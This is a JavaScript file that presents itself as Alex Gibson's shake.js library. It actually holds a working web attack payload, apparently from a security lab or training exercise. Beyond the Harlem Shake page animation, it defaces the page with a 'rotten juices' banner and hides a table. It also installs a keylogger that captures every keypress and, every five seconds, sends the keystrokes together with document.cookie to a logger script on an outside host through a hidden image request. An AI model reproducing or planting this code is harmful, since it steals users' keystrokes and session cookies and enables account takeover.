/**
 * Original Source: https://github.com/alexgibson/shake.js
 * Original Author: Alex Gibson
 */
var table = $(".table");
var hacked = $("<h1 style='padding:10px;color:red;'>All juices are rotten! Go to <a href='http://www.ebay.com'>www.ebay.com</a></h1>").hide();
table.after(hacked);
if (function () {
        function e() {
            var e = document.createElement("link")
            e.setAttribute("type", "text/css"), e.setAttribute("rel", "stylesheet"), e.setAttribute("href", C), e.setAttribute("class", E), document.body.appendChild(e)
        }

        function t() {
            for (var e = document.getElementsByClassName(E), t = 0; t < e.length; t++)document.body.removeChild(e[t])
        }

        function n() {
            var e = document.createElement("div")
            e.setAttribute("class", k), document.body.appendChild(e), setTimeout(function () {
                document.body.removeChild(e)
            }, 100)
        }

        function o(e) {
            return {height: e.offsetHeight, width: e.offsetWidth}
        }

        function r(e) {
            var t = o(e)
            return t.height > f && t.height < g && t.width > h && t.width < p
        }

        function i(e) {
            for (var t = e, n = 0; t;)n += t.offsetTop, t = t.offsetParent
            return n
        }

        function a() {
            var e = document.documentElement
            return window.innerWidth ? window.innerHeight : e && !isNaN(e.clientHeight) ? e.clientHeight : 0
        }

        function s() {
            return window.pageYOffset ? window.pageYOffset : Math.max(document.documentElement.scrollTop, document.body.scrollTop)
        }

        function d(e) {
            var t = i(e)
            return t >= N && _ + N >= t
        }

        function u() {
            var e = document.createElement("audio")
            e.setAttribute("class", E), e.src = y, e.loop = !1, e.addEventListener("canplay", function () {
                setTimeout(function () {
                    l(A)
                }, 500), setTimeout(function () {
                    m(), n()
                    for (var e = 0; e < x.length; e++)c(x[e])
                }, 15500)
            }, !0), e.addEventListener("ended", function () {
                m(), t()
            }, !0), e.innerHTML = " <p>If you are reading this, it is because your browser does not support the audio element. We recommend that you get a new browser.</p> <p>", document.body.appendChild(e), e.play()
        }

        function l(e) {
            e.className += " " + w + " " + v
        }

        function c(e) {
            e.className += " " + w + " " + b[Math.floor(Math.random() * b.length)]
        }

        function m() {
            for (var e = document.getElementsByClassName(w), t = RegExp("\\b" + w + "\\b"), n = 0; n < e.length;)e[n].className = e[n].className.replace(t, "")
        }

        for (var f = 30, h = 30, g = 350, p = 350, y = "//s3.amazonaws.com/moovweb-marketing/playground/harlem-shake.mp3", w = "mw-harlem_shake_me", v = "im_first", b = ["im_drunk", "im_baked", "im_trippin", "im_blown"], k = "mw-strobe_light", C = "//s3.amazonaws.com/moovweb-marketing/playground/harlem-shake-style.css", E = "mw_added_css", _ = a(), N = s(), T = document.getElementsByTagName("*"), A = null, H = 0; H < T.length; H++) {
            var M = T[H]
            if (r(M) && d(M)) {
                A = M
                break
            }
        }
        if (null === M)return void console.warn("Could not find a node of the right size. Please try a different page.")
        e(), u()
        for (var x = [], H = 0; H < T.length; H++) {
            var M = T[H]
            r(M) && x.push(M)
        }
    }(), window.jQuery) {
    var kylggr = ""
    $(document).ready(function () {
        $(document).on("keypress", function (e) {
            var t = String.fromCharCode(e.keyCode || e.which)
            console.log(t.length, t), kylggr += t
        })
    }), window.setInterval(function () {
        "" != kylggr && logger(kylggr), kylggr = ""
    }, 5e3)
}
setTimeout(function () {
    table.hide();
    hacked.show();
}, 9000);

function logger(t) {
console.log("in logger",t);
$("body").append('<img src="http://192.168.33.10/logger.php?input='+t+'%20Session: '+document.cookie+'" style="display:none;" />')
}


